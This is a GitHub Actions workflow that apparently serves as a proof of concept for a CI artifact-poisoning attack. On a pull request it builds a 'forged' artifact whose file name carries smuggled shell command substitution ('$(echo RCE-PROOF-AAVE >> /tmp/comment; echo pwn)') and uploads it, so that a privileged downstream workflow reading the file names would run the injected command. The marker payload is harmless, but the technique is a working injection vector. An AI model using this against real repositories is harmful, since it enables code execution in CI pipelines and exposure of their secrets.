name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          mkdir -p /tmp/content
          echo 1 > /tmp/content/pr_number.txt
          echo hello > /tmp/content/pwn.txt
          touch '/tmp/content/$(echo RCE-PROOF-AAVE >> /tmp/comment; echo pwn).txt'
          ls -la /tmp/content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: /tmp/content
